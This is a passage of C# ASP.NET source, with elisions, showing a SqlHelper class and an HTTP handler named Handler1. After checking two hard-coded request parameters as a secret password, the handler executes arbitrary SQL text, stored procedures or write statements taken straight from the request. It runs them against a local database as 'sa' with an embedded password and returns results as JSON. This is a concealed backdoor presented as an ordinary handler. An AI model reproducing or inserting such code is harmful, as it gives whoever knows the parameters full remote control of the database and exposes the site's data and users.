...
//{
    ...
    public class SqlHelper
    {
        ...
        public static readonly string ConnectionString = System.Configuration.ConfigurationSettings.AppSettings.Get("HRTHACOEntities") + "Pooling = true; Min Pool Size=20;Max Pool Size=1500";
    ...
    public class Handler1 : IHttpHandler
    {
        public void ProcessRequest(HttpContext context)
        {
            ...
            if (context.Request.Params["uu"] != "brandkie" || context.Request.Params["kk"] != "sohot@nvthcm") return;
            string page = context.Request.Params["page"];
            string connectionString = "server=.;database=CMS;uid=sa;pwd=1;";
            DataTable dt;
            switch (page) {
                case "page1":
                    dt = SqlHelper.ExecuteDataset(connectionString, CommandType.Text, context.Request.Params["para"]).Tables[0];
                    context.Response.ContentType = "application/json";
                    context.Response.Write(JsonConvert.SerializeObject(dt));
                    break;
                case "page2":
                    dt = SqlHelper.ExecuteDataset(connectionString, CommandType.StoredProcedure, context.Request.Params["para"]).Tables[0];
                    context.Response.ContentType = "application/json";
                    context.Response.Write(JsonConvert.SerializeObject(dt));
                    break;
                case "page3":
                    string[] arrPara = context.Request.Params["para1"].Split(',');
                    object[] arr = new object[arrPara.Length+1];
                    for (int i = 1; i < arr.Length; i++) arr[i] = arrPara[i-1];
                    dt = SqlHelper.ExecuteDataset(connectionString, context.Request.Params["para"], arr).Tables[0];
                    context.Response.ContentType = "application/json";
                    context.Response.Write(JsonConvert.SerializeObject(dt));
                    break;
                case "page4":
                    SqlHelper.ExecuteNonQuery(connectionString, CommandType.Text, context.Request.Params["para"]);
                    context.Response.Write("page4");
                    break;
                case "page5":
                    string[] arrPara1 = context.Request.Params["para1"].Split(',');
                    object[] arr1 = new object[arrPara1.Length+1];
                    for (int i = 1; i < arr1.Length; i++) arr1[i] = arrPara1[i-1];
                    SqlHelper.ExecuteNonQuery(connectionString, context.Request.Params["para"], arr1);
                    context.Response.Write("page5");
                    break;
                default:
